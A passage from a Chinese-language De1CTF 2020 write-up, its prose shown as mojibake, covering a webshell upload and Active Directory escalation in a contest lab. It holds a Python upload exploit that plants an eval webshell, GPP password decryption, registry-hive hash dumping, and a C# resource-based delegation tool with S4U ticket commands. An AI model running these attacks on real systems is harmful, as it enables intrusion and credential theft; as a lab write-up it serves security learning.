class="string">&lt;?=++$_______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=++$_______?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=$________='_'?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=$_________=$__.$___.$__.$____.$_____.$______?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$__________=$________.$_______.$_____.$____?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=$____________________=$$__________?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?=$____________________[_]($____________________[__],$____________________[___])?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">data=data.format(<span class="string">"syc.pHp"</span>,payload)</span><br><span class="line"></span><br><span class="line">r=requests.post(url=url,headers=headers,data=data)</span><br><span class="line"></span><br><span class="line">filename=re.search(<span class="string">"in:(uploads/.*)"</span>,r.text).group(<span class="number">1</span>)</span><br><span class="line">filename=filename.strip()</span><br><span class="line"></span><br><span class="line">print(<span class="string">"http://47.113.219.76/"</span>+filename)</span><br><span class="line">r=requests.get(<span class="string">"http://47.113.219.76/"</span>+filename+<span class="string">"?_=file_put_contents&amp;__=1.php&amp;___=&lt;?php eval($_POST[a]);?&gt;"</span>)</span><br><span class="line"></span><br><span class="line">print(r.status_code)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<p>æ‰“å®Œè®¿é—®å¯¹åº”ç›®å½•æ˜¯ä¸‹çš„1.phpï¼Œå¯†ç æ˜¯aã€‚</p>
<p>è¿ä¸ŠwebshellåæŠŠshellåå¼¹åˆ°csä¸Šï¼Œä½¿ç”¨powerviewè¿›è¡Œä¿¡æ¯æ”¶é›†å¯ä»¥çœ‹åˆ°ï¼ŒåŸŸå†…å…±äº«æœ‰ä¸€ä¸ªhintã€‚</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell<span class="literal">-import</span> /Users/cengsiqi/Desktop/pentest/wintool/PowerView<span class="literal">-dev</span>.ps1</span><br><span class="line">powershell <span class="built_in">get-domaincomputer</span>|<span class="built_in">get-netshare</span></span><br></pre></td></tr></table></figure>

<p><img src="1588571307111-5e34ec2e-3746-4588-a39a-10f3a9f63a25.png#align=left&display=inline&height=370&margin=%5Bobject%20Object%5D&name=image.png&originHeight=740&originWidth=1972&size=170863&status=done&style=none&width=986" alt="image.png"><br>æŸ¥çœ‹è¿™ä¸ªHintå¯ä»¥å‘ç°ï¼Œæœ‰ä¸€ä¸ªæ‹¿flagçš„tipã€‚</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">shell dir \\dc.De1CTF2020.lab\Hin</span><br></pre></td></tr></table></figure>

<p><img src="1588571461665-c690928a-3e23-45b0-a976-6085f19c8b8c.png#align=left&display=inline&height=294&margin=%5Bobject%20Object%5D&name=image.png&originHeight=516&originWidth=1310&size=89949&status=done&style=none&width=746" alt="image.png"><br>æŠŠæç¤ºæ‹·è´ä¸‹æ¥ä¸‹è½½å‘ç°è¿™ä¸ªzipéœ€è¦å¯†ç æ‰èƒ½æ‰“å¼€ã€‚</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">shell copy \\dc.De1CTF2020.lab\Hint\flag1_and_flag2hint.zip .</span><br></pre></td></tr></table></figure>

<p><img src="1588571579651-4a3a8b66-d1f2-45fd-a1f5-0f3ece8c3806.png#align=left&display=inline&height=128&margin=%5Bobject%20Object%5D&name=image.png&originHeight=240&originWidth=1394&size=41584&status=done&style=none&width=746" alt="image.png"><br><img src="1588571632020-37b1afd9-feb0-418c-ad5d-1c4498fd8e69.png#align=left&display=inline&height=232&margin=%5Bobject%20Object%5D&name=image.png&originHeight=228&originWidth=734&size=162224&status=done&style=none&width=746" alt="image.png"></p>
<p>æ¥ç€æ”¶é›†ï¼ŒåŸŸå†…ç”¨æˆ·ä¿¡æ¯å‘ç°æœ‰ä¸€ä¸ªå¯ç–‘ç”¨æˆ·ã€‚</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">shell net user /dom</span><br></pre></td></tr></table></figure>

<p><img src="1588571706287-81a8ed6d-3616-4d15-8bf5-71f73ddd2ab0.png#align=left&display=inline&height=278&margin=%5Bobject%20Object%5D&name=image.png&originHeight=512&originWidth=1372&size=69925&status=done&style=none&width=746" alt="image.png"><br>çŒœæµ‹HintZip_Passè´¦æˆ·å¯†ç å°±æ˜¯è§£å‹ç¼©çš„å¯†ç ã€‚è¿™é‡Œç»è¿‡ä¸€äº›å°è¯•ä¹‹åè€ƒè™‘ä¼šä¸ä¼šæ˜¯gppå°è¯•psç›´æ¥å¯¼å‡ºï¼Œå‘ç°çˆ†äº†ä¸ªé”™ï¼Œçœ‹æ„æ€æ˜¯è¯´å½“å‰ç”¨æˆ·ä¸æ˜¯domain userï¼ˆå®¢è§‚äº‹å®æ˜¯å½“å‰è´¦æˆ·å°±æ˜¯åŸŸç”¨æˆ·ï¼‰ã€‚</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell<span class="literal">-import</span> /Users/cengsiqi/Desktop/pentest/<span class="built_in">Get-GPPPassword</span>.ps1</span><br><span class="line">powershell <span class="built_in">Get-GPPPassword</span></span><br></pre></td></tr></table></figure>

<p><img src="1588572573067-016fb792-b6b8-4668-bcf1-867cd7c903d6.png#align=left&display=inline&height=264&margin=%5Bobject%20Object%5D&name=image.png&originHeight=528&originWidth=3320&size=219484&status=done&style=none&width=1660" alt="image.png"><br>ä¹Ÿä¸ä¼šæ”¹powershellï¼Œå°±ç›´æ¥æ‰‹åŠ¨éå†SYSVOLäº†ï¼ˆè¿˜å¥½ä¸æ˜¯å¾ˆå¤šï¼Œå¤šçš„è¯å»ºè®®å¼¹åˆ°msfä¸Šç”¨msfçš„è„šæœ¬æï¼‰<br><img src="1588572660278-a2470a51-0660-40e9-84db-f27631fd0de1.png#align=left&display=inline&height=165&margin=%5Bobject%20Object%5D&name=image.png&originHeight=330&originWidth=3098&size=139547&status=done&style=none&width=1549" alt="image.png"></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span><br><span class="line">&lt;Groups clsid=<span class="string">"&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;"</span>&gt;&lt;User clsid=<span class="string">"&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;"</span> name=<span class="string">"HintZip_Pass"</span> image=<span class="string">"2"</span> changed=<span class="string">"2020-04-15 14:43:23"</span> uid=<span class="string">"&#123;D33537C1-0BDB-44B7-8628-A6030A298430&#125;"</span>&gt;&lt;Properties action=<span class="string">"U"</span> newName=<span class="string">""</span> fullName=<span class="string">""</span> description=<span class="string">""</span> cpassword=<span class="string">"uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08"</span> changeLogon=<span class="string">"1"</span> noChange=<span class="string">"0"</span> neverExpires=<span class="string">"0"</span> acctDisabled=<span class="string">"0"</span> userName=<span class="string">"HintZip_Pass"</span>/&gt;&lt;/User&gt;</span><br><span class="line">&lt;/Groups&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">gpp<span class="literal">-decrypt</span> uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+<span class="number">08</span></span><br></pre></td></tr></table></figure>

<p><img src="1588572802371-89b2b0bb-448d-4a90-bf15-98e33fc1aeb7.png#align=left&display=inline&height=57&margin=%5Bobject%20Object%5D&name=image.png&originHeight=114&originWidth=1560&size=30614&status=done&style=none&width=780" alt="image.png"><br>ç”¨zL1PpP@sSwO3dè§£å¯†åˆšæ‰çš„å‹ç¼©åŒ…flag1_and_flag2hint.zipå³å¯å¾—åˆ°ï¼Œç¬¬ä¸€ä¸ªflagå’Œä¸‹ä¸€å…³çš„æç¤ºã€‚<br><img src="1588573070964-1b84f5a1-acb3-4953-9c2d-73178a7d1f04.png#align=left&display=inline&height=212&margin=%5Bobject%20Object%5D&name=image.png&originHeight=424&originWidth=1910&size=215139&status=done&style=none&width=955" alt="image.png"></p>
<h2 id="pentest2"><a href="#pentest2" class="headerlink" title="pentest2"></a>pentest2</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag1: De1CTF&#123;GpP_11Is_SoOOO_Ea3333y&#125;</span><br><span class="line"></span><br><span class="line">Get flag2 Hint:</span><br><span class="line">hint1: You need De1ta user to get flag2</span><br><span class="line">hint2: De1ta user&#39;s password length is 1-8, and the password is composed of [0-9a-f].</span><br><span class="line">hint3: Pay attention to the extended rights of De1ta user on the domain.</span><br><span class="line">hint4: flag2 in Domain Controller (C:\Users\Administrator\Desktop\flag.txt)</span><br><span class="line"></span><br><span class="line">PS: Please do not damage the environment after getting permission, thanks QAQ.</span><br></pre></td></tr></table></figure>

<p>ä»æç¤ºå¯ä»¥çœ‹å‡ºæ¥ï¼Œå‡ºé¢˜çš„æ€è·¯æ˜¯ï¼Œé€šè¿‡æŸç§ç¦»çº¿çˆ†ç ´çš„æ–¹æ³•æ‹¿åˆ°De1taå¯†ç ï¼ŒDe1taç”¨æˆ·å­˜åœ¨aclæ»¥ç”¨é—®é¢˜ä»¥è‡³äºå¯ä»¥æåˆ°åŸŸæ§æ‹¿ä¸‹è¯»åˆ°C:\Users\Administrator\Desktop\flag.txtã€‚</p>
<p>å…³äºå¦‚ä½•ç¦»çº¿çˆ†ç ´æˆ‘è¿™é‡Œæ˜¯éé¢„æœŸï¼Œä¹‹å‰æœåŠ¡å™¨webè´¦å·æœ‰ç‰¹æƒå¯ä»¥juicypotatoææƒã€‚<br><img src="1588573565560-9d6716f9-d32b-4eb5-9a9c-91711b04a197.png#align=left&display=inline&height=170&margin=%5Bobject%20Object%5D&name=image.png&originHeight=340&originWidth=1518&size=164466&status=done&style=none&width=759" alt="image.png"><br>æˆ‘ä¸€ç›´æ²¡æˆåŠŸã€‚<br><img src="1588573783800-0db2592f-a2cd-4c5f-9cdd-4ca11d0cf248.png#align=left&display=inline&height=143&margin=%5Bobject%20Object%5D&name=image.png&originHeight=286&originWidth=2938&size=333395&status=done&style=none&width=1469" alt="image.png"><br>å½“æ—¶æœ‰å…¶ä»–å¸ˆå‚…æˆåŠŸï¼Œç»™æˆ‘å¼¹äº†ä¸ªsystem shellã€‚<br><img src="1588573859200-550561f7-5f5a-4a84-a1fa-e13ccac3ada6.png#align=left&display=inline&height=850&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1700&originWidth=2336&size=1034458&status=done&style=none&width=1168" alt="image.png"><br>å¯¼å‡ºDe1taè´¦æˆ·çš„mscach</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save hklm\system system.hive</span><br><span class="line">reg save hklm\security security.hive</span><br><span class="line"></span><br><span class="line">python secretsdump.py -security &#x2F;Users&#x2F;cengsiqi&#x2F;Desktop&#x2F;hash&#x2F;security.hive -system &#x2F;Users&#x2F;cengsiqi&#x2F;Desktop&#x2F;hash&#x2F;SYSTEM.hive LOCAL</span><br></pre></td></tr></table></figure>


<p><img src="1588574718180-d11b9ed0-667b-4ae6-99e4-e01193c87746.png#align=left&display=inline&height=475&margin=%5Bobject%20Object%5D&name=image.png&originHeight=950&originWidth=1648&size=236880&status=done&style=none&width=824" alt="image.png"><br>å¯ä»¥æ‹¿åˆ°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DE1CTF2020.LAB&#x2F;De1ta:$DCC2$10240#De1ta#52c2cfff23d879a2ba830cf184c10b46</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®æç¤ºçš„å¯†ç å¤æ‚åº¦ï¼Œç”¨hascatè·‘å‡ºæ¥ç»“æœæ˜¯3f23ea12ã€‚</p>
<p>å¯†ç æœ‰äº†ä¸‹ä¸€æ­¥æ ¹æ®æç¤ºæ¥Delta aclæ»¥ç”¨é—®é¢˜ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell-import &#x2F;Users&#x2F;cengsiqi&#x2F;Desktop&#x2F;pentest&#x2F;wintool&#x2F;PowerView-master.ps1</span><br><span class="line">powershell Get-ObjectAcl -Domain De1CTF2020.lab -ResolveGUIDs|?&#123;$_.IdentityReference -eq &quot;DE1CTF2020\De1ta&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºå‡ºæ¥äº†å¾ˆå¤šä¸œè¥¿é‡ç‚¹å…³æ³¨ä¸¤ä¸ªåœ°æ–¹ï¼Œç¬¬ä¸€ä¸ªåœ°æ–¹æ˜¯De1taçš„ExtendedRightè®©ä»–å…·å¤‡Dcshadowçš„æ”»å‡»çš„èƒ½åŠ›ã€‚<br><img src="1588575673500-53352e9a-aeb4-4e14-9ad0-b26a863c9020.png#align=left&display=inline&height=677&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1354&originWidth=1986&size=264009&status=done&style=none&width=993" alt="image.png"></p>
<p><img src="1588575717063-9f145c16-c35c-42f5-a0e6-e5324a265a61.png#align=left&display=inline&height=780&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1560&originWidth=2814&size=306391&status=done&style=none&width=1407" alt="image.png"></p>
<p>é€šè¿‡æŸ¥é˜…èµ„æ–™å¯ä»¥çŸ¥é“Dcshadowæ”»å‡»æ—¶éœ€è¦De1taè¿™ç§ç‰¹æƒè´¦å·å’Œä¸€ä¸ªSYSTEMè´¦å·ã€‚åšåˆ°è¿™é‡Œçš„æ—¶å€™juciypotatoå·²ç»ä¿®äº†ï¼Œä¹‹å‰æŠ“çš„administrator hashä¹Ÿæ”¹äº†ã€‚ï¼ˆ<strong>ç»éªŒä¸ä¸°å¯Œï¼Œå¦‚æœä¹‹å‰æŠ“äº†æœºå™¨hashä¹Ÿèƒ½ææƒäº†</strong>ï¼‰ã€‚</p>
<p>æ¥ä¸‹æ¥å°±éœ€è¦å…³æ³¨ç¬¬äºŒä¸ªåœ°æ–¹äº†ã€‚De1taç”¨æˆ·å¯¹DMæœºå™¨å…·æœ‰WritePropertyï¼Œç¯å¢ƒåˆæ˜¯12ï¼Œæ‰€ä»¥å¯ä»¥ç”¨çƒ‚ç•ªèŒ„ææƒã€‚<br><img src="1588581133347-61181c79-d803-4958-8961-9ffbcfcbd06d.png#align=left&display=inline&height=218&margin=%5Bobject%20Object%5D&name=image.png&originHeight=436&originWidth=1468&size=81567&status=done&style=none&width=734" alt="image.png"></p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Security.AccessControl;</span><br><span class="line"><span class="keyword">using</span> System.Security.Principal;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Addnew_MachineAccount</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            String DomainController = <span class="string">"192.168.0.12"</span>;</span><br><span class="line">            String Domain = <span class="string">"De1CTF2020.lab"</span>;</span><br><span class="line">            String new_MachineAccount = <span class="string">"lisan4"</span>; <span class="comment">//æ·»åŠ çš„æœºå™¨è´¦æˆ·</span></span><br><span class="line">            String new_MachineAccount_password = <span class="string">"sycl0ver"</span>; <span class="comment">//æœºå™¨è´¦æˆ·å¯†ç </span></span><br><span class="line">            String victimcomputer = <span class="string">"DM"</span>; <span class="comment">//éœ€è¦è¿›è¡Œææƒçš„æœºå™¨</span></span><br><span class="line">            String victimcomputer_ldap_path = <span class="string">"LDAP://CN=DM,CN=Computers,DC=De1CTF2020,DC=lab"</span>;</span><br><span class="line">            String machine_account = new_MachineAccount;</span><br><span class="line">            String sam_account = machine_account + <span class="string">"$"</span>;</span><br><span class="line"></span><br><span class="line">            String distinguished_name = <span class="string">""</span>;</span><br><span class="line">            String[] DC_array = <span class="literal">null</span>;</span><br><span class="line">            distinguished_name = <span class="string">"CN="</span> + machine_account + <span class="string">",CN=Computers"</span>;</span><br><span class="line">            DC_array = Domain.Split(<span class="string">'.'</span>);</span><br><span class="line">            <span class="keyword">foreach</span> (String DC <span class="keyword">in</span> DC_array)</span><br><span class="line">            &#123;</span><br><span class="line">                distinguished_name += <span class="string">",DC="</span> + DC;</span><br><span class="line">            &#125;</span><br><span class="line">            Console.WriteLine(<span class="string">"[+] Elevate permissions on "</span> + victimcomputer);</span><br><span class="line">            Console.WriteLine(<span class="string">"[+] Domain = "</span> + Domain);</span><br><span class="line">            Console.WriteLine(<span class="string">"[+] Domain Controller = "</span> + DomainController);</span><br><span class="line">            <span class="comment">//Console.WriteLine("[+] New SAMAccountName = " + sam_account);</span></span><br><span class="line">            <span class="comment">//Console.WriteLine("[+] Distinguished Name = " + distinguished_name);</span></span><br><span class="line">            <span class="comment">//è¿æ¥ldap</span></span><br><span class="line">            System.DirectoryServices.Protocols.LdapDirectoryIdentifier identifier = <span class="keyword">new</span> System.DirectoryServices.Protocols.LdapDirectoryIdentifier(DomainController, <span class="number">389</span>);</span><br><span class="line">            <span class="comment">//NetworkCredential nc = new NetworkCredential(username, password); //ä½¿ç”¨å‡­æ®ç™»å½•            </span></span><br><span class="line"></span><br><span class="line">            System.DirectoryServices.Protocols.LdapConnection connection = <span class="literal">null</span>;</span><br><span class="line">            <span class="comment">//connection = new System.DirectoryServices.Protocols.LdapConnection(identifier, nc);</span></span><br><span class="line">            connection = <span class="keyword">new</span> System.DirectoryServices.Protocols.LdapConnection(identifier);</span><br><span class="line">            connection.SessionOptions.Sealing = <span class="literal">true</span>;</span><br><span class="line">            connection.SessionOptions.Signing = <span class="literal">true</span>;</span><br><span class="line">            connection.Bind();</span><br><span class="line">            <span class="keyword">var</span> request = <span class="keyword">new</span> System.DirectoryServices.Protocols.AddRequest(distinguished_name, <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute[] &#123;</span><br><span class="line">                <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">"DnsHostName"</span>, machine_account +<span class="string">"."</span>+ Domain),</span><br><span class="line">                <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">"SamAccountName"</span>, sam_account),</span><br><span class="line">                <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">"userAccountControl"</span>, <span class="string">"4096"</span>),</span><br><span class="line">                <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">"unicodePwd"</span>, Encoding.Unicode.GetBytes(<span class="string">"\""</span> + new_MachineAccount_password + <span class="string">"\""</span>)),</span><br><span class="line">                <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">"objectClass"</span>, <span class="string">"Computer"</span>),</span><br><span class="line">               <span class="keyword">new</span> System.DirectoryServices.Protocols.DirectoryAttribute(<span class="string">"ServicePrincipalName"</span>, <span class="string">"HOST/"</span>+machine_account+<span class="string">"."</span>+Domain,<span class="string">"RestrictedKrbHost/"</span>+machine_account+<span class="string">"."</span>+Domain,<span class="string">"HOST/"</span>+machine_account,<span class="string">"RestrictedKrbHost/"</span>+machine_account)</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//æ·»åŠ æœºå™¨è´¦æˆ·</span></span><br><span class="line">                connection.SendRequest(request);</span><br><span class="line">                Console.WriteLine(<span class="string">"[+] Machine account: "</span> + machine_account + <span class="string">" Password: "</span> + new_MachineAccount_password + <span class="string">" added"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (System.Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">"[-] The new machine could not be created! User may have reached ms-DS-new_MachineAccountQuota limit.)"</span>);</span><br><span class="line">                Console.WriteLine(<span class="string">"[-] Exception: "</span> + ex.Message);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// è·å–æ–°è®¡ç®—æœºå¯¹è±¡çš„SID</span></span><br><span class="line">            <span class="keyword">var</span> new_request = <span class="keyword">new</span> System.DirectoryServices.Protocols.SearchRequest(distinguished_name, <span class="string">"(&amp;(samAccountType=805306369)(|(name="</span> + machine_account + <span class="string">")))"</span>, System.DirectoryServices.Protocols.SearchScope.Subtree, <span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">var</span> new_response = (System.DirectoryServices.Protocols.SearchResponse)connection.SendRequest(new_request);</span><br><span class="line">            SecurityIdentifier sid = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (System.DirectoryServices.Protocols.SearchResultEntry entry <span class="keyword">in</span> new_response.Entries)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    sid = <span class="keyword">new</span> SecurityIdentifier(entry.Attributes[<span class="string">"objectsid"</span>][<span class="number">0</span>] <span class="keyword">as</span> <span class="keyword">byte</span>[], <span class="number">0</span>);</span><br><span class="line">                    Console.Out.WriteLine(<span class="string">"[+] "</span> + new_MachineAccount + <span class="string">" SID : "</span> + sid.Value);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span></span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(<span class="string">"[!] It was not possible to retrieve the SID.\nExiting..."</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//è®¾ç½®èµ„æºçº¦æŸå§”æ´¾</span></span><br><span class="line">            System.DirectoryServices.DirectoryEntry myldapConnection = <span class="keyword">new</span> System.DirectoryServices.DirectoryEntry(<span class="string">"De1CTF2020.lab"</span>,<span class="string">"De1ta"</span>, <span class="string">"3f23ea12"</span>);</span><br><span class="line"></span><br><span class="line">            myldapConnection.Path = victimcomputer_ldap_path;</span><br><span class="line"></span><br><span class="line">            myldapConnection.AuthenticationType = System.DirectoryServices.AuthenticationTypes.Secure;</span><br><span class="line">            System.DirectoryServices.DirectorySearcher search = <span class="keyword">new</span> System.DirectoryServices.DirectorySearcher(myldapConnection);</span><br><span class="line">            <span class="comment">//é€šè¿‡ldapæ‰¾è®¡ç®—æœº</span></span><br><span class="line">            search.Filter = <span class="string">"(CN="</span> + victimcomputer + <span class="string">")"</span>;</span><br><span class="line">            <span class="keyword">string</span>[] requiredProperties = <span class="keyword">new</span> <span class="keyword">string</span>[] &#123; <span class="string">"samaccountname"</span> &#125;;</span><br><span class="line">            <span class="keyword">foreach</span> (String property <span class="keyword">in</span> requiredProperties)</span><br><span class="line">                search.PropertiesToLoad.Add(property);</span><br><span class="line">            System.DirectoryServices.SearchResult result = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                result = search.FindOne();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (System.Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(ex.Message + <span class="string">"Exiting..."</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (result != <span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                System.DirectoryServices.DirectoryEntry entryToUpdate = result.GetDirectoryEntry();</span><br><span class="line">                String sec_desc = <span class="string">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;"</span> + sid.Value + <span class="string">")"</span>;</span><br><span class="line">                System.Security.AccessControl.RawSecurityDescriptor sd = <span class="keyword">new</span> RawSecurityDescriptor(sec_desc);</span><br><span class="line">                <span class="keyword">byte</span>[] riptor_buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[sd.BinaryLength];</span><br><span class="line">                sd.GetBinaryForm(riptor_buffer, <span class="number">0</span>);</span><br><span class="line">                <span class="comment">// æ·»åŠ evilpcçš„sidåˆ°msds-allowedtoactonbehalfofotheridentityä¸­</span></span><br><span class="line">                entryToUpdate.Properties[<span class="string">"msds-allowedtoactonbehalfofotheridentity"</span>].Value = riptor_buffer;</span><br><span class="line">                <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    entryToUpdate.CommitChanges();<span class="comment">//æäº¤æ›´æ”¹</span></span><br><span class="line">                    Console.WriteLine(<span class="string">"[+] Exploit successfully!"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (System.Exception ex)</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(ex.Message);</span><br><span class="line">                    Console.WriteLine(<span class="string">"[!] \nFailed..."</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºç¯å¢ƒå¾ˆæ··ä¹±å‡ ä¸ªé˜Ÿä¼éƒ½åœ¨ç›¸äº’è¦†ç›–msds-allowedtoactonbehalfofotheridentityï¼Œæ‰€ä»¥å…ˆåæ·»åŠ äº†å¤šä¸ªspnã€‚ã€‚lisan3$ lisan4$<br><img src="1588576411595-d794a138-0eb8-4738-b4c5-ea04f61683b3.png#align=left&display=inline&height=243&margin=%5Bobject%20Object%5D&name=image.png&originHeight=362&originWidth=1112&size=65288&status=done&style=none&width=746" alt="image.png"><br>åŠ ä¸Šå§”æ´¾ä¹‹åç„¶åå°±æ˜¯s4uææƒäº†ã€‚è¿™é‡Œè¸©äº†å¤§å‘ï¼Œä¸‹é¢æ¥è¯´ä¸€ä¸‹ã€‚æˆ‘å…ˆç”¨çš„kekeoã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tgt::ask &#x2F;user:lisan3$ &#x2F;domain:De1CTF2020.lab &#x2F;ntlm:30a7b270355d67451970d37ff1c9b666</span><br><span class="line">tgs::s4u &#x2F;tgt:TGT_lisan3$@DE1CTF2020.LAB_krbtgt~De1CTF2020.lab@DE1CTF2020.LAB.kirbi &#x2F;user:Administrator@De1CTF2020.lab &#x2F;service:cifs&#x2F;DM.De1CTF2020.lab</span><br></pre></td></tr></table></figure>

<p>S4U2selfæˆåŠŸS4U2Proxyå¤±è´¥ï¼ˆ<strong>å½“æ—¶åå¤ç¡®è®¤è¿‡å§”æ´¾åŠ ä¸Šäº†çš„</strong>ï¼‰<br><img src="1588578737623-9634b019-dbd5-4878-b9b2-c970e69673fb.png#align=left&display=inline&height=285&margin=%5Bobject%20Object%5D&name=image.png&originHeight=776&originWidth=2032&size=191776&status=done&style=none&width=746" alt="image.png"><br><img src="1588578449118-60bc0cf5-845d-4a75-9838-3537490e2e89.png#align=left&display=inline&height=233&margin=%5Bobject%20Object%5D&name=image.png&originHeight=978&originWidth=3130&size=307346&status=done&style=none&width=746" alt="image.png"></p>
<p>æ¢ä¸ªå·¥å…·rubues<br><img src="1588578877865-fa62ab88-598a-448a-9f29-a5e09ad0154b.png#align=left&display=inline&height=657&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1314&originWidth=1520&size=477950&status=done&style=none&width=760" alt="image.png"><br>ä½†æ˜¯dirå§‹ç»ˆä¸æˆåŠŸï¼ˆåæ¥é—®äº†ä¸€ä¸ªå¸ˆå‚…ç­”å¤æ˜¯ï¼šè®¿é—®è‡ªå·±æœ¬èº«é»˜è®¤éƒ½æ˜¯ç”¨å½“å‰ç”¨æˆ·èº«ä»½å»è®¤è¯ï¼Œä¸èµ°ç½‘ç»œè®¤è¯ï¼Œå¿…é¡»å¾—ä¸»åŠ¨è°ƒç”¨ç½‘ç»œè®¤è¯æ‰è¡Œï¼‰ã€‚<br><img src="1588578947263-dd9595db-1ef7-4933-956f-802b8d5973f2.png#align=left&display=inline&height=447&margin=%5Bobject%20Object%5D&name=image.png&originHeight=894&originWidth=2030&size=165161&status=done&style=none&width=1015" alt="image.png"><br>èµ°åˆ°è¿™é‡Œå¤©è‰²å·²æ™šæœ‰ç‚¹è‚ä¸åŠ¨äº†ï¼Œå°±æ²¡ç»§ç»­äº†ã€‚ç¬¬äºŒå¤©æ¯”èµ›ç»“æŸå‡ºé¢˜å¸ˆå‚…ç»™æˆ‘è¯´ç”¨impakectå°±å¯ä»¥s4uè€Œä¸”èƒ½æˆã€‚</p>
